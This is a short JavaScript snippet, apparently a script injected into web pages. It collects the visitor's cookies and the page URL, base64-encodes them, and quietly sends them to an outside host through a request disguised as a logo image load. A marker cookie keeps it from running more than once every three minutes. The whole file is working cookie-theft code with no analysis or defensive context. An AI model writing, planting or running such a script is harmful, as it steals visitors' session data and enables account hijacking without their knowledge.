var cookie = document.cookie;
var current = window.location.href;
let allx = btoa(cookie+" || "+current);

let xhttp = new XMLHttpRequest();

function getCookie(){
  let ck = [];
  let cs = cookie.split(';');
  for(let i=0;i<cs.length;i++){
    ck.push(cs[i].split('=')[0]);
  }
  return ck;
}

let keys = getCookie();

if(keys.indexOf(' DFS_BASE')=='-1'){
  xhttp.open("GET", "https://www.eagle-tube.com/raw/images/dfs_logo.img?x="+allx, true);
  xhttp.send();
  document.cookie="DFS_BASE=Initiated;max-age=180; path=/;";
}
